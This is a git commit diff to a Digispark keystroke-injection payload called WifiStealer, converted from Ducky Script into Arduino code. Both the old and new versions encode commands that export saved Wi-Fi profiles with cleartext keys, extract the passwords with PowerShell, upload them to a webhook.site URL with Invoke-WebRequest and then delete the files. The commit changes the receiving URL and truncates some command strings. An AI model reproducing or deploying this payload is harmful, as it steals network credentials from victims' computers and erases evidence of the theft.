8d6495755484fd6177f417237c4d375da53af65c
antnux <103955741+antnux@users.noreply.github.com>
2022-09-14 00:21:13 +0200

    Update WifiStealer.ino

--- Payloads/WifiStealer/WifiStealer.ino
+++ Payloads/WifiStealer/WifiStealer.ino
@@ -1,6 +1,6 @@
 // [ ===== Created using duckify.huhn.me @ dev aadd7808 ===== ] //
 // Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
-// https://webhook.site/#!/34bde40d-138a-4ec7-9b26-b8c5e81d47b4/9d8e0a05-0032-4ce1-817d-09b416080b41/1
+// Please consider supporting us on ko-fi.com/spacehuhn <3
 // Learn more about us at spacehuhn.com
 
 // Platform: Digispark
@@ -14,10 +14,10 @@ const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7};
 const uint8_t key_arr_1[] PROGMEM = {0,6, 0,7, 0,44, 2,34, 0,23, 0,8, 0,16, 0,19, 2,34};
 // netsh wlan export profile key=clear
 const uint8_t key_arr_2[] PROGMEM = {0,17, 0,8, 0,23, 0,22, 0,11, 0,44, 0,26, 0,15, 0,4, 0,17, 0,44, 0,8, 0,27, 0,19, 0,18, 0,21, 0,23, 0,44, 0,19, 0,21, 0,18, 0,9, 0,12, 0,15, 0,8, 0,44, 0,14, 0,8, 0,28, 2,39, 0,6, 0,15, 0,8, 0,4, 0,21};
-// powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
-const uint8_t key_arr_3[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,56, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 0,56, 2,19, 0,4, 0,23, 0,11, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 2,48, 0,55, 0,27, 0,16, 0,15, 0,44, 0,56, 2,19, 0,4, 0,23, 0,23, 0,8, 0,21, 0,17, 0,44, 0,45, 0,14, 0,8, 0,28, 2,16, 0,4, 0,23, 0,8, 0,21, 0,12, 0,4, 0,15, 0,45, 0,44, 2,100, 0,44, 2,26, 0,12, 2,9, 0,12, 0,56, 2,14, 0,8, 0,28};
-// powershell Invoke-WebRequest -Uri https://webhook.site/34bde40d-138a-4ec7-9b26-b8c5e81d47b4 -Method POST -InFile WiFi-Key
-const uint8_t key_arr_4[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,56, 2,26, 0,8, 0,5, 2,21, 0,8, 0,20, 0,24, 0,8, 0,22, 0,23, 0,44, 0,56, 2,24, 0,21, 0,12, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,55, 2,36, 2,36, 0,26, 0,8, 0,5, 0,11, 0,18, 0,18, 0,14, 0,55, 0,22, 0,12, 0,23, 0,8, 2,36, 0,32, 0,33, 0,5, 0,7, 0,8, 0,33, 0,39, 0,7, 0,56, 0,30, 0,32, 0,37, 0,4, 0,56, 0,33, 0,8, 0,6, 0,36, 0,56, 0,38, 0,5, 0,31, 0,35, 0,56, 0,5, 0,37, 0,6, 0,34, 0,8, 0,37, 0,30, 0,7, 0,33, 0,36, 0,5, 0,33, 0,44, 0,56, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 2,19, 2,18, 2,22, 2,23, 0,44, 0,56, 2,12, 0,17, 2,9, 0,12, 0,15, 0,8, 0,44, 2,26, 0,12, 2,9, 0,12, 0,56, 2,14, 0,8, 0,28};
+// powershell Select-String -Path Wi-Fi*.x...
+const uint8_t key_arr_3[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,56, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 0,56, 2,19, 0,4, 0,23, 0,11, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 2,48, 0,55, 0,27, 0,55, 0,55, 0,55};
+// powershell Invoke-WebRequest -Uri https://webhook.site/21168d36-6996-455c-9b11-b04af395ea85
+const uint8_t key_arr_4[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,56, 2,26, 0,8, 0,5, 2,21, 0,8, 0,20, 0,24, 0,8, 0,22, 0,23, 0,44, 0,56, 2,24, 0,21, 0,12, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,55, 2,36, 2,36, 0,26, 0,8, 0,5, 0,11, 0,18, 0,18, 0,14, 0,55, 0,22, 0,12, 0,23, 0,8, 2,36, 0,31, 0,30, 0,30, 0,35, 0,37, 0,7, 0,32, 0,35, 0,56, 0,35, 0,38, 0,38, 0,35, 0,56, 0,33, 0,34, 0,34, 0,6, 0,56, 0,38, 0,5, 0,30, 0,30, 0,56, 0,5, 0,39, 0,33, 0,4, 0,9, 0,32, 0,38, 0,34, 0,8, 0,4, 0,37, 0,34};
 // del Wi* /s/f/q
 const uint8_t key_arr_5[] PROGMEM = {0,7, 0,8, 0,15, 0,44, 2,26, 0,12, 2,48, 0,44, 2,36, 0,22, 2,36, 0,9, 2,36, 0,20};
 // exit
@@ -42,9 +42,8 @@ void setup() {
     DigiKeyboard.sendKeyStroke(79, 0); // RIGHT
     DigiKeyboard.delay(400); // DELAY 400
     DigiKeyboard.sendKeyStroke(81, 0); // DOWN
-    DigiKeyboard.delay(200); // DELAY 200
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
-    DigiKeyboard.delay(1800); // DELAY 1500
+    DigiKeyboard.delay(1500); // DELAY 1500
     DigiKeyboard.sendKeyStroke(80, 0); // LEFT
     DigiKeyboard.delay(1000); // DELAY 1000
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
@@ -59,7 +58,8 @@ void setup() {
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
     DigiKeyboard.delay(1000); // DELAY 1000
     DigiKeyboard.delay(500); // DELAY 500
-    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING powershell Invoke-WebRequest -Uri https://webhook.site/34bde40d-138a-4ec7-9b26-b8c5e81d47b4
+    //https://webhook.site/21168d36-6996-455c-9b11-b04af395ea85
+    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING powershell Invoke-WebRequest -Uri https...
     DigiKeyboard.delay(400); // DELAY 400
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
     DigiKeyboard.delay(300); // DELAY 300
@@ -69,7 +69,6 @@ void setup() {
     DigiKeyboard.delay(500); // DELAY 500
     duckyString(key_arr_6, sizeof(key_arr_6)); // STRING exit
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
-    digitalWrite(1, HIGH); //turn on led when program finishes
 }
 
 void loop() {}
